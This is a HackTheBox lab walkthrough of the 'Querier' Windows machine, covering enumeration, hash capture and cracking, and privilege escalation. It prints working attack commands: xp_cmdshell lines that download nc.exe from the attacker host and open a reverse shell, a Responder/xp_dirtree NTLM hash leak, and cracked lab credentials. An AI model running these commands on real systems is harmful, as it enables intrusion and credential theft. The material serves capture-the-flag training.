---
title: HackTheBox - Querier
description:  Querier is a medium difficulty Windows box which has an Excel spreadsheet in a world-readable file share. The spreadsheet has macros, which connect to MSSQL server running on the box. The SQL server can be used to request a file through which NetNTLMv2 hashes can be leaked and cracked to recover the plaintext password. After logging in, PowerUp can be used to find Administrator credentials in a locally cached group policy file. 
date: 2024-08-20 11:16:00 +0530
categories: [HackTheBox]
tags: [hackthebox, Medium, Windows]
image:
  path: /assets/img/headers/htb_querier.webp
---


## Enumeration

Started testing with basic nmap scan.

### Nmap

```console
$ sudo nmap 10.10.10.125 -sC -sV -Pn               
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-19 16:28 IST
Nmap scan report for 10.10.10.125
Host is up (0.33s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-08-19T10:59:32+00:00; -1s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.10.125:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-19T10:24:08
|_Not valid after:  2054-08-19T10:24:08
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-19T10:59:25
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.74 seconds
```

### SMBclient

```console
$ smbclient -L 10.10.10.125 -N          

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
```

if we mount the share and check **Reports** disk, we found .XLSM file.  i used **oletools** for inspecting this file.

[https://github.com/decalage2/oletools](https://github.com/decalage2/oletools)


```console
$ sudo mount -t cifs //10.10.10.125/reports /mnt/querier

$ olevba -c querier/Currency\ Volume\ Report.xlsm 
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.2 on Python 3.11.9 - http://decalage.info/python/oletools
===============================================================================
FILE: querier/Currency Volume Report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)

$ sudo umount /mnt/querier
```

We found a sql server account details in above strings. we will use these to connect to the sql server we found in nmap scan.


### impacket-mssqlclient


`$ impacket-mssqlclient reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth`

After logging in to sql server, nothing of interest is found. Hence i tried to use **responder** to get the **NetNTLMv2** hash.

`$ sudo responder -I tun0`

After Responder is started, run the below command in **impacket-mssqlclient**.

`exec master.dbo.xp_dirtree '\\10.10.16.3\kali'`

```console
[SNIP]
[+] Listening for events...                                                                            


[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:1f201577f24d2870:17574AA1DD7A6EF4DCCBCA47D12FEB7E:010100000000000080F79AF163F2DA014BEB01E3C022A6BD00000000020008004A004E004100480001001E00570049004E002D0042004500310050004B0054005700550058005700360004003400570049004E002D0042004500310050004B005400570055005800570036002E004A004E00410048002E004C004F00430041004C00030014004A004E00410048002E004C004F00430041004C00050014004A004E00410048002E004C004F00430041004C000700080080F79AF163F2DA01060004000200000008003000300000000000000000000000003000005569D4EB3496B5E01C2F8FD2154424055ED95640092402E2819B1B83F8D2B4D10A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003300000000000000000000000000  
```

### Hashcat

We can find out the type of Hash and try to crack it using `hashcat` and `rockyou.txt`

>https://hashcat.net/wiki/doku.php?id=example_hashes


Put ntlmv2-ssp hash in hash.txt

`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt.gz`

`MSSQL-SVC::QUERIER:1f201577f24d2870:17574aa1dd7a6ef4dccbca47d12feb7e:010100000000000080f79af163f2da014beb01e3c022a6bd00000000020008004a004e004100480001001e00570049004e002d0042004500310050004b0054005700550058005700360004003400570049004e002d0042004500310050004b005400570055005800570036002e004a004e00410048002e004c004f00430041004c00030014004a004e00410048002e004c004f00430041004c00050014004a004e00410048002e004c004f00430041004c000700080080f79af163f2da01060004000200000008003000300000000000000000000000003000005569d4eb3496b5e01c2f8fd2154424055ed95640092402e2819b1b83f8d2b4d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003300000000000000000000000000:corporate568`

| username | password |
|----------|----------|
| MSSQL-SVC | corporate568 |

## Foothold

connect back to SQL server via the new account and now we have access to **enable_xp_cmdshell** and **reconfigure**. Use **nc.exe** and python server to get get reverse connection.

```console

enable_xp_cmdshell

reconfigure

xp_cmdshell "powershell.exe wget http://10.10.16.3:8000/nc.exe -OutFile C:\\Users\Public\\nc.exe"

xp_cmdshell "C:\\Users\Public\\nc.exe -e cmd.exe 10.10.16.3 1234"
nc -lnvp 1234
```

## Privilege Escalation

I used **powerup** script to check for enumeration. served via python server.


```console

$ powershell wget http://10.10.16.3:8000/PowerUp.ps1 -o powerup.ps1

PS C:\Users\Public> . .\PowerUp.ps1
. .\PowerUp.ps1
PS C:\Users\Public> Invoke-AllChecks

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```

### impacket-wmiexec

We found the administrator credentials  in this. we can login as admin by using **impacket-wmiexec**.

```console
$ impacket-wmiexec 'Administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125'
C:\>type C:\Users\Administrator\Desktop\root.txt
```
